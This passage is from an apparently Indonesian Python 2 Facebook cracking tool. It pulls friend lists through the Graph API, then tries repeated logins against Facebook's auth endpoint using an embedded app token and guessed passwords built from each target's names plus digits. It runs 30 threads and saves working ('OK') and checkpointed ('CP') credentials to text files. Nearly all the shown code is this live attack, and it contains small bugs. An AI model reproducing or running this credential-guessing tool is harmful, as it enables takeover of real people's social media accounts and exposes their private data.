                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass2
                    cps = open('save/userid.txt', 'a')
                    cps.write('[CP] ' + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass3
                        okb = open('save/userid.txt', 'a')
                        okb.write('[CP] ' + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass3
                        cps = open('save/userid.txt', 'a')
                        cps.write('[CP] ' + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass4
                            okb = open('save/userid.txt', 'a')
                            okb.write('[OK] ' + c + user + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass4
                            cps = open('save/userid.txt', 'a')
                            cps.write('[CP] ' + c + user + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass5
                                okb = open('save/userid.txt', 'a')
                                okb.write('[OK]' + c + user + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass5
                                cps.open('save/userid.txt', 'a')
                                cps.write('[CP]' + c + user + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
                            else:
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                w = json.load(data)
                                if 'access_token' in w:
                                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + m +  user +  ' | '  +  pass6
                                    okb = open('save/userid.txt', 'a')
                                    okb.write('[OK] ' + m + user + ' | ' + pass6 + '\n')
                                    okb.close()
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in w['error_msg']:
                                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + m + user +  ' | '  +  pass6
                                    cps = open('save/userid.txt', 'a')
                                    cps.write('[CP] ' + m + user + ' | ' + pass6 + '\n')
                                    cps.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    w = json.load(data)
                                    if 'access_token' in w:
                                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + m + user +  ' | '  +  pass7
                                        okb = open('save/userid.txt', 'a')
                                        okb.write('[OK] ' + m + user + ' | ' + pass7 + '\n')
                                        okb.close()
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in w['error_msg']:
                                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + m + user +  ' | '  +  pass7
                                        cps = open('save/userid.txt', 'a')
                                        cps.write('[CP] ' + m + user + ' | ' + pass7 + '\n')
                                        cps.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        w = json.load(data)
                                        if 'access_token' in w:
                                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + m + user +  ' | '  +  pass8
                                            okb = open('save/userid.txt', 'a')
                                            okb.write('[CP] ' + m + user + ' | ' + pass8 + '\n')
                                            okb.close()
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in w['error_msg']:
                                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + m + user +  ' | '  +  pass8
                                            cps = open('save/userid.txt', 'a')
                                            cps.write('[CP] ' + m + user + ' | ' + pass8 + '\n')
                                            cps.close()
                                            cekpoint.append(user + pass8)
                                        else:
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            w = json.load(data)
                                            if 'access_token' in w:
                                                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + m + user +  ' | '  +  pass9
                                                okb = open('save/userid.txt', 'a')
                                                okb.write('[OK] ' + m + user + ' | ' + pass9 + '\n')
                                                okb.close()
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in w['error_msg']:
                                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + m + user +  ' | '  +  pass9
                                                cps = open('save/userid.txt', 'a')
                                                cps.write('[CP] ' + m + user + ' | ' + pass9 + '\n')
                                                cps.close()
                                                cekpoint.append(user + pass9)
                                            else:
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                w = json.load(data)
                                                if 'access_token' in w:
                                                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + m + user +  ' | '  +  pass10
                                                    okb = open('save/userid.txt', 'a')
                                                    okb.write('[OK]' + m + user + ' | ' + pass10 + '\n')
                                                    okb.close()
                                                    oks.append(user + pass10)
                                                elif 'www.facebook.com' in w['error_msg']:
                                                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + m + user +  ' | '  +  pass10
                                                    cps.open('save/userid.txt', 'a')
                                                    cps.write('[CP]' + m + user + ' | ' + pass10 + '\n')
                                                    cps.close()
                                                    cekpoint.append(user + pass10)
  
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42*"\033[1;96m="
    print '\033[1;96m[✓] \x1b[1;93mCrack Selesai ....'
    print '\033[1;96m[✓] \x1b[1;93mTotal \x1b[1;34mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;34m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\033[1;96m[✓] \x1b[1;97mCP/OK tersimpan : save/userid.txt'
    print 42*"\033[1;96m="
    raw_input('\x1b[1;97m[\x1b[1;92m KEMBALI \x1b[1;97m]')
    os.system('python2 upil.py')


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mSepertinya akun anda kena checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;96m[✓] \033[1;93mNama \033[1;91m: \033[1;92m"+nama+"\033[1;97m"
	print "\033[1;96m[✓] \033[1;93mID   \033[1;91m: \033[1;92m"+id+"\033[1;97m"
	print 42*"\033[1;96m="
	print "\x1b[1;96m[1] \x1b[1;93m Crack FB "
	print "\x1b[1;96m[0] \x1b[1;91m Keluar            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m pilih nomor : \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih()
	elif unikers =="1":
		mbf()
	elif unikers =="0":
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih()


def mbf():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;96m[1] \x1b[1;93mHack dari daftar teman "
	print "\x1b[1;96m[2] \x1b[1;93mHack dari daftar teman ke teman "
	print "\x1b[1;96m[0] \x1b[1;91mKembali"
	pilih_mbf()


def pilih_mbf():
	peak = raw_input("\n\033[1;97m pilih nomor : \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		mbf()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":	
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			mbf()
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		mbf()

	
	print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	pass1 = raw_input("\033[1;36m[1] \033[1;93mPassword \033[1;91m: \033[1;97m")
	pass2 = raw_input("\033[1;36m[2] \033[1;93mPassword \033[1;91m: \033[1;97m")
	pass3 = raw_input("\033[1;36m[3] \033[1;93mPassword \033[1;91m: \033[1;97m")
	pass9 = raw_input("\033[1;36m[4] \033[1;93mPassword \033[1;91m: \033[1;97m")
	pass18 = raw_input("\033[1;36m[5] \033[1;93mPassword \033[1;91m: \033[1;97m")
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	print "\033[96m| 😎 | " + 3*" " + "\033[35mIdentitas" + 4*" " + "\033[96m" + 5*" " + "\033[33mPassword" + 8*" " + "\033[96m"
	print 42*"\033[1;96m="


	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
				print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
					print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
					cek = open("out/mbf_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cp.append(user+pass1)
				else:
					pass2
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
						print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
						print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
							print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
							cek = open("out/mbf_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cp.append(user+pass2)
						else:
							pass3
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
								print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
									print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
									cek = open("out/mbf_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cp.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
										print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
											print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
											cek = open("out/mbf_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cp.append(user+pass4)
										else:
											pass5 = b['last_name'] + '12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
												print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
												print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
													print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
													print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
													cek = open("out/mbf_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cp.append(user+pass5)
												else:
													pass6 = b['first_name'] + '222'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
														print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
														print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
															print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
															print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
															cek = open("out/mbf_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cp.append(user+pass6)
														else:
															pass7 = b['first_name'] + '111'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																	print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																	print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																	cek = open("out/mbf_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cp.append(user+pass7)
																else:
																	pass8 = b['first_name'] + '12345'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																		print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
																		print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																			print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
																			print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																			cek = open("out/mbf_cp.txt", "a")
																			cek.write(user+"|"+pass8+"\n")
																			cek.close()
																			cp.append(user+pass8)
																		else:
																			pass9
																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			q = json.load(data)
																			if 'access_token' in q:
																				print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																				print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
																				print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																				oks.append(user+pass9)
																			else:
																				if 'www.facebook.com' in q["error_msg"]:
																					print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																					print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
																					print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																					cek = open("out/mbf_cp.txt", "a")
																					cek.write(user+"|"+pass9+"\n")
																					cek.close()
																					cp.append(user+pass9)
																				else:
																					pass10 = b['last_name'] + '123'
																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																					q = json.load(data)
																					if 'access_token' in q:
																						print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																						print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10
																						print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																						oks.append(user+pass10)
																					else:
																						if 'www.facebook.com' in q["error_msg"]:
																							print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																							print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10
																							print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																							cek = open("out/mbf_cp.txt", "a")
																							cek.write(user+"|"+pass10+"\n")
																							cek.close()
																							cp.append(user+pass10)
																						else:
																							pass11 = b['first_name'] + '786'
																							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																							q = json.load(data)
																							if 'access_token' in q:
																								print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																								print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11
																								print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																								oks.append(user+pass11)
																							else:
																								if 'www.facebook.com' in q["error_msg"]:
																									print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																									print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11
																									print '\033[1;96m| \033[1;31mTL \033[1;97m|\033[1;93m '+b['birthday']
																									cek = open("out/mbf_cp.txt", "a")
																									cek.write(user+"|"+pass11+"\n")
																									cek.close()
																									cp.append(user+pass11)
																								else:
																									pass12 = b['first_name'] + '12'
																									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									q = json.load(data)
																									if 'access_token' in q:
																										print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																										print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12
																										print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																										oks.append(user+pass12)
																									else:
																										if 'www.facebook.com' in q["error_msg"]:
																											print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																											print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12
																											print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																											cek = open("out/mbf_cp.txt", "a")
																											cek.write(user+"|"+pass12+"\n")
																											cek.close()
																											cp.append(user+pass12)
																										else:
																											pass13 = b['first_name'] + '1234'
																											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																											q = json.load(data)
																											if 'access_token' in q:
																												print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																												print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass13
																												print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																												oks.append(user+pass13)
																											else:
																												if 'www.facebook.com' in q["error_msg"]:
																													print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																													print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass13
																													print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																													cek = open("out/mbf_cp.txt", "a")
																													cek.write(user+"|"+pass13+"\n")
																													cek.close()
																													cp.append(user+pass13)
																												else:
																													pass14 = b['fist_name']
																													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																													q = json.load(data)
